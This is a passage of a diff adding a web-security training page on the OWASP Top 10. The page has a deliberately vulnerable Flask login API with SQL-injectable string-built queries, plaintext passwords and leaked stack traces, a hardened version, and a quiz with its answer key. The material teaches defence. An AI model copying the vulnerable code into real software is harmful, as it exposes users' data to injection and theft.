+        insert = f"INSERT INTO users (username, password, email) VALUES ('{username}', '{password}', '{email}')"
+        cursor.execute(insert)
+        conn.commit()
+        conn.close()
+        
+        return jsonify({"success": True, "message": "User created"})
+    except Exception as e:
+        return jsonify({"error": str(e), "stack": traceback.format_exc()}), 500
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.json['username']
+    password = request.json['password']
+    
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    conn = sqlite3.connect('app.db')
+    cursor = conn.cursor()
+    cursor.execute(query)
+    user = cursor.fetchone()
+    conn.close()
+    
+    if user:
+        return jsonify({"token": "abc123", "user": username})
+    return jsonify({"error": "Bad credentials"}), 401
+
+@app.route('/user/<user_id>')
+def get_user(user_id):
+    query = f"SELECT * FROM users WHERE id={user_id}"
+    conn = sqlite3.connect('app.db')
+    cursor = conn.cursor()
+    cursor.execute(query)
+    user = cursor.fetchone()
+    conn.close()
+    
+    if user:
+        return jsonify({"id": user[0], "username": user[1], "password": user[2], "email": user[3]})
+    return jsonify({"error": "Not found"}), 404
+
+if __name__ == '__main__':
+    app.run(debug=True)`;
+
+            const secureChallengeCode = `# SECURE Authentication API - All Vulnerabilities Fixed
+from flask import Flask, request, jsonify
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+import sqlite3
+import bcrypt
+import jwt
+import re
+import logging
+from datetime import datetime, timedelta
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'your-secret-key-from-env'
+
+# ✅ Rate limiting
+limiter = Limiter(app, key_func=get_remote_address)
+
+# ✅ Audit logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+def validate_password(password):
+    """✅ Strong password policy"""
+    if len(password) < 12:
+        return False, "Password must be at least 12 characters"
+    if not re.search(r'[A-Z]', password):
+        return False, "Password must contain uppercase letter"
+    if not re.search(r'[a-z]', password):
+        return False, "Password must contain lowercase letter"
+    if not re.search(r'\\d', password):
+        return False, "Password must contain digit"
+    if not re.search(r'[!@#$%^&*]', password):
+        return False, "Password must contain special character"
+    return True, None
+
+def validate_email(email):
+    """✅ Email validation"""
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
+    return re.match(pattern, email) is not None
+
+@app.route('/register', methods=['POST'])
+@limiter.limit("5 per hour")  # ✅ Rate limiting
+def register():
+    try:
+        data = request.get_json()
+        username = data.get('username', '').strip()
+        password = data.get('password', '')
+        email = data.get('email', '').strip()
+        
+        # ✅ Input validation
+        if not username or not password or not email:
+            return jsonify({"error": "All fields required"}), 400
+        
+        if len(username) > 50:
+            return jsonify({"error": "Username too long"}), 400
+        
+        if not validate_email(email):
+            return jsonify({"error": "Invalid email format"}), 400
+        
+        # ✅ Password strength check
+        valid, error = validate_password(password)
+        if not valid:
+            return jsonify({"error": error}), 400
+        
+        # ✅ Parameterized query
+        conn = sqlite3.connect('app.db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
+        
+        if cursor.fetchone():
+            conn.close()
+            return jsonify({"error": "User exists"}), 400
+        
+        # ✅ Hash password with bcrypt
+        password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=10))
+        
+        # ✅ Parameterized insert
+        cursor.execute(
+            "INSERT INTO users (username, password_hash, email, created_at) VALUES (?, ?, ?, ?)",
+            (username, password_hash, email, datetime.utcnow())
+        )
+        conn.commit()
+        user_id = cursor.lastrowid
+        conn.close()
+        
+        # ✅ Audit log
+        logger.info(f"User registered: {username} from {get_remote_address()}")
+        
+        return jsonify({"success": True, "user_id": user_id}), 201
+        
+    except Exception as e:
+        # ✅ Generic error to user, detailed log server-side
+        logger.error(f"Registration error: {str(e)}")
+        return jsonify({"error": "Registration failed. Please try again."}), 500
+
+@app.route('/login', methods=['POST'])
+@limiter.limit("5 per 15 minutes")  # ✅ Rate limiting
+def login():
+    try:
+        data = request.get_json()
+        username = data.get('username', '').strip()
+        password = data.get('password', '')
+        
+        if not username or not password:
+            return jsonify({"error": "Credentials required"}), 400
+        
+        # ✅ Parameterized query
+        conn = sqlite3.connect('app.db')
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT id, username, password_hash FROM users WHERE username = ?",
+            (username,)
+        )
+        user = cursor.fetchone()
+        conn.close()
+        
+        # ✅ Constant-time password comparison
+        if user and bcrypt.checkpw(password.encode('utf-8'), user[2]):
+            # ✅ Generate secure JWT token
+            token = jwt.encode({
+                'user_id': user[0],
+                'username': user[1],
+                'exp': datetime.utcnow() + timedelta(hours=24)
+            }, app.config['SECRET_KEY'], algorithm='HS256')
+            
+            # ✅ Audit log
+            logger.info(f"Login success: {username} from {get_remote_address()}")
+            
+            return jsonify({"token": token, "username": user[1]}), 200
+        
+        # ✅ Generic error (no info leakage)
+        logger.warning(f"Login failed: {username} from {get_remote_address()}")
+        return jsonify({"error": "Invalid credentials"}), 401
+        
+    except Exception as e:
+        logger.error(f"Login error: {str(e)}")
+        return jsonify({"error": "Login failed"}), 500
+
+@app.route('/user/<int:user_id>')
+@limiter.limit("60 per minute")
+def get_user(user_id):
+    try:
+        # ✅ Authorization check
+        token = request.headers.get('Authorization', '').replace('Bearer ', '')
+        if not token:
+            return jsonify({"error": "Unauthorized"}), 401
+        
+        try:
+            payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        
+        # ✅ Authorization: Users can only access their own data
+        if payload['user_id'] != user_id:
+            logger.warning(f"Unauthorized access attempt: user {payload['user_id']} tried to access user {user_id}")
+            return jsonify({"error": "Forbidden"}), 403
+        
+        # ✅ Parameterized query
+        conn = sqlite3.connect('app.db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT id, username, email FROM users WHERE id = ?", (user_id,))
+        user = cursor.fetchone()
+        conn.close()
+        
+        if user:
+            # ✅ No password exposure
+            return jsonify({
+                "id": user[0],
+                "username": user[1],
+                "email": user[2]
+            }), 200
+        
+        return jsonify({"error": "User not found"}), 404
+        
+    except Exception as e:
+        logger.error(f"Get user error: {str(e)}")
+        return jsonify({"error": "Request failed"}), 500
+
+# ✅ Security headers
+@app.after_request
+def set_security_headers(response):
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    return response
+
+if __name__ == '__main__':
+    app.run(debug=False, ssl_context='adhoc')  # ✅ HTTPS only`;
+
+            monaco.editor.create(document.getElementById('vulnerable-sql'), {
+                value: vulnerableSQLCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: false },
+                fontSize: 13,
+                readOnly: true
+            });
+
+            monaco.editor.create(document.getElementById('secure-sql'), {
+                value: secureSQLCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: false },
+                fontSize: 13,
+                readOnly: true
+            });
+
+            monaco.editor.create(document.getElementById('vulnerable-xss'), {
+                value: vulnerableXSSCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: false },
+                fontSize: 13,
+                readOnly: true
+            });
+
+            monaco.editor.create(document.getElementById('secure-xss'), {
+                value: secureXSSCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: false },
+                fontSize: 13,
+                readOnly: true
+            });
+
+            monaco.editor.create(document.getElementById('challenge-code-editor'), {
+                value: vulnerableChallengeCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: true },
+                fontSize: 13,
+                readOnly: true,
+                lineNumbers: 'on'
+            });
+
+            monaco.editor.create(document.getElementById('solution-secure-editor'), {
+                value: secureChallengeCode,
+                language: 'python',
+                theme: 'vs-dark',
+                minimap: { enabled: true },
+                fontSize: 13,
+                readOnly: true,
+                lineNumbers: 'on'
+            });
+
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.addEventListener('click', function() {
+                const container = this.closest('.playground-container');
+                container.querySelectorAll('.tab-btn').forEach(b => {
+                    b.classList.remove('active');
+                    b.style.borderBottomColor = 'transparent';
+                    b.style.color = 'var(--text-secondary)';
+                });
+                container.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+                
+                this.classList.add('active');
+                this.style.borderBottomColor = 'var(--hub-primary)';
+                this.style.color = 'var(--hub-primary)';
+                document.getElementById(this.getAttribute('data-tab')).style.display = 'block';
+            }));
+        });
+        
+        // Quiz Data
+        const quizData = [
+            {
+                question: "What is the #1 vulnerability in the OWASP Top 10 (2021)?",
+                options: ["Injection", "Broken Access Control", "XSS", "Security Misconfiguration"],
+                correct: 1,
+                explanation: "Broken Access Control moved to #1 in 2021, affecting 94% of applications tested. It occurs when users can act outside their intended permissions."
+            },
+            {
+                question: "How does SQL injection work?",
+                options: ["Exploits weak passwords", "Injects malicious SQL code via user input", "Uses brute force", "Steals cookies"],
+                correct: 1,
+                explanation: "SQL injection occurs when attacker-controlled input is concatenated into SQL queries, allowing execution of arbitrary database commands."
+            },
+            {
+                question: "Which defense prevents SQL injection most effectively?",
+                options: ["Firewall", "Parameterized queries/prepared statements", "Input length limits", "HTTPS"],
+                correct: 1,
+                explanation: "Parameterized queries (prepared statements) treat user input as literal data, not executable code, making SQL injection impossible."
+            },
+            {
+                question: "What does XSS (Cross-Site Scripting) allow attackers to do?",
+                options: ["Access the server file system", "Execute JavaScript in victim's browser", "Decrypt passwords", "DDoS the server"],
+                correct: 1,
+                explanation: "XSS injects malicious scripts into web pages viewed by other users, executing JavaScript in their browsers to steal sessions, credentials, or perform actions as the victim."
+            },
+            {
+                question: "How should passwords be stored securely?",
+                options: ["Plaintext", "Encrypted", "Hashed with bcrypt/Argon2", "Base64 encoded"],
+                correct: 2,
+                explanation: "Use cryptographic hashing (bcrypt, Argon2) with salts. Hashing is one-way and designed for password verification, unlike encryption which is reversible."
+            },
+            {
+                question: "What is 'defense-in-depth'?",
+                options: ["Using very complex passwords", "Multiple layers of security controls", "Hiding security flaws", "Only one strong firewall"],
+                correct: 1,
+                explanation: "Defense-in-depth uses multiple security layers (input validation, authentication, authorization, encryption, etc.) so if one fails, others still protect the system."
+            },
+            {
+                question: "What does 'Broken Access Control' mean?",
+                options: ["Weak passwords", "Users can access resources they shouldn't", "No HTTPS", "SQL injection vulnerability"],
+                correct: 1,
+                explanation: "Broken Access Control occurs when authorization checks fail, allowing users to view, modify, or delete data they shouldn't have permission to access."
+            },
+            {
+                question: "Which HTTP security header prevents XSS attacks?",
+                options: ["Access-Control-Allow-Origin", "Content-Security-Policy", "Cache-Control", "Accept-Language"],
+                correct: 1,
+                explanation: "Content-Security-Policy (CSP) header restricts which scripts can execute, significantly reducing XSS attack surface by blocking inline scripts and untrusted sources."
+            },
+            {
+                question: "What is SSRF (Server-Side Request Forgery)?",
+                options: ["SQL injection variant", "Attacker makes server request internal resources", "Password cracking", "DDoS attack"],
+                correct: 1,
+                explanation: "SSRF tricks the server into making requests to internal systems (cloud metadata, databases, admin panels) that attackers can't reach directly from the internet."
+            },
+            {
+                question: "Why is security logging important?",
+                options: ["Required by law only", "Detects attacks, aids forensics, proves compliance", "Improves performance", "Reduces storage"],
+                correct: 1,
+                explanation: "Security logs detect ongoing attacks, provide forensic evidence for investigations, demonstrate compliance, and help identify patterns for improving defenses."
+            }
+        ];
+        
+        function renderQuiz() {
+            const quizContainer = document.getElementById('quiz');
+            quizContainer.innerHTML = quizData.map((item, index) => `
+                <div class="quiz-question" style="margin-bottom: var(--spacing-2xl); padding: var(--spacing-lg); background: rgba(26, 31, 58, 0.5); border-radius: 8px; border: 1px solid var(--module-border);">
+                    <h4 style="color: var(--text-primary); margin-bottom: var(--spacing-md); font-size: 1.1rem;">
+                        Question ${index + 1}: ${item.question}
+                    </h4>
+                    <div class="options-container">
+                        ${item.options.map((option, optIndex) => `
+                            <label class="quiz-option" style="display: block; padding: var(--spacing-md); margin: var(--spacing-sm) 0; background: rgba(123, 97, 255, 0.1); border: 2px solid transparent; border-radius: 8px; cursor: pointer; transition: all 0.2s ease;">
+                                <input type="radio" name="question-${index}" value="${optIndex}" style="margin-right: var(--spacing-sm);">
+                                <span style="color: var(--text-secondary);">${option}</span>
+                            </label>
+                        `).join('')}
+                    </div>
+                    <div id="feedback-${index}" class="question-feedback" style="display: none; margin-top: var(--spacing-md); padding: var(--spacing-md); border-radius: 6px;"></div>
+                </div>
+            `).join('');
+            
+            quizContainer.innerHTML += `
+                <button id="submit-quiz-btn" class="submit-quiz-btn" style="padding: var(--spacing-md) var(--spacing-2xl); background: var(--hub-primary); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;">
+                    🛡️ Submit Security Quiz
+                </button>
+            `;
+            
+            document.querySelectorAll('.quiz-option').forEach(option => {
+                option.addEventListener('mouseenter', function() {
+                    this.style.borderColor = 'var(--hub-primary)';
+                    this.style.background = 'rgba(123, 97, 255, 0.2)';
+                });
+                option.addEventListener('mouseleave', function() {
+                    if (!this.querySelector('input').checked) {
+                        this.style.borderColor = 'transparent';
+                        this.style.background = 'rgba(123, 97, 255, 0.1)';
+                    }
+                });
+                option.addEventListener('click', function() {
+                    const questionContainer = this.closest('.quiz-question');
+                    questionContainer.querySelectorAll('.quiz-option').forEach(opt => {
+                        opt.style.borderColor = 'transparent';
+                        opt.style.background = 'rgba(123, 97, 255, 0.1)';
+                    });
+                    this.style.borderColor = 'var(--hub-primary)';
+                    this.style.background = 'rgba(123, 97, 255, 0.2)';
+                });
+            });
+            
+            document.getElementById('submit-quiz-btn').addEventListener('click', submitQuiz);
+        }
+        
+        function submitQuiz() {
+            let correctCount = 0;
+            
+            quizData.forEach((item, index) => {
+                const selectedOption = document.querySelector(`input[name="question-${index}"]:checked`);
+                const feedback = document.getElementById(`feedback-${index}`);
+                
+                if (selectedOption) {
+                    const answerIndex = parseInt(selectedOption.value);
+                    const isCorrect = answerIndex === item.correct;
+                    
+                    if (isCorrect) {
+                        correctCount++;
+                        feedback.style.display = 'block';
+                        feedback.style.background = 'rgba(16, 185, 129, 0.1)';
+                        feedback.style.borderLeft = '4px solid #10b981';
+                        feedback.innerHTML = `
+                            <strong style="color: #10b981;">✅ Correct!</strong><br>
+                            <span style="color: var(--text-secondary); font-size: 0.95rem;">${item.explanation}</span>
+                        `;
+                    } else {
+                        feedback.style.display = 'block';
+                        feedback.style.background = 'rgba(239, 68, 68, 0.1)';
+                        feedback.style.borderLeft = '4px solid #ef4444';
+                        feedback.innerHTML = `
+                            <strong style="color: #ef4444;">❌ Incorrect</strong><br>
+                            <span style="color: var(--text-secondary); font-size: 0.95rem;">The correct answer is: <strong>${item.options[item.correct]}</strong></span><br>
+                            <span style="color: var(--text-secondary); font-size: 0.95rem;">${item.explanation}</span>
+                        `;
+                    }
+                } else {
+                    feedback.style.display = 'block';
+                    feedback.style.background = 'rgba(251, 191, 36, 0.1)';
+                    feedback.style.borderLeft = '4px solid #fbbf24';
+                    feedback.innerHTML = `<strong style="color: #fbbf24;">⚠️ No answer selected</strong>`;
+                }
+            });
+            
+            const percentage = (correctCount / quizData.length) * 100;
+            const resultsContainer = document.getElementById('quiz-results');
+            const scoreDisplay = document.getElementById('score-display');
+            
+            let grade, color, message;
+            if (percentage >= 90) {
+                grade = 'Excellent!';
+                color = '#10b981';
+                message = 'Outstanding security knowledge! 🏆';
+            } else if (percentage >= 70) {
+                grade = 'Good Job!';
+                color = '#00d4ff';
+                message = 'Solid understanding of OWASP Top 10! 👍';
+            } else if (percentage >= 50) {
+                grade = 'Keep Learning';
+                color = '#fbbf24';
+                message = 'Review security concepts and try again! 📚';
+            } else {
+                grade = 'Needs Improvement';
+                color = '#ef4444';
+                message = 'Study the vulnerabilities before retrying. 💪';
+            }
+            
+            scoreDisplay.innerHTML = `
+                <div style="text-align: center;">
+                    <h3 style="color: ${color}; font-size: 2rem; margin-bottom: var(--spacing-sm);">${grade}</h3>
+                    <p style="font-size: 1.5rem; color: var(--text-primary); margin-bottom: var(--spacing-sm);">
+                        Score: ${correctCount}/${quizData.length} (${percentage.toFixed(0)}%)
+                    </p>
+                    <p style="color: var(--text-secondary);">${message}</p>
+                </div>
+            `;
+            
+            resultsContainer.style.display = 'block';
+            
+            const submitBtn = document.getElementById('submit-quiz-btn');
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.5';
+            submitBtn.style.cursor = 'not-allowed';
+            
+            resultsContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        
+        document.getElementById('retry-quiz')?.addEventListener('click', () => {
+            document.getElementById('quiz-results').style.display = 'none';
+            renderQuiz();
+        });
+        
+        document.getElementById('show-security-solution')?.addEventListener('click', function() {
+            document.getElementById('security-solution').style.display = 'block';
+            this.disabled = true;
+            this.style.opacity = '0.5';
+            this.style.cursor = 'not-allowed';
+        });
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            createOWASPTop10Viz();
+            renderQuiz();
+            console.log("✅ OWASP Top 10 module loaded with security visualizations!");
+        });
+    </script>
+</body>
+</html>
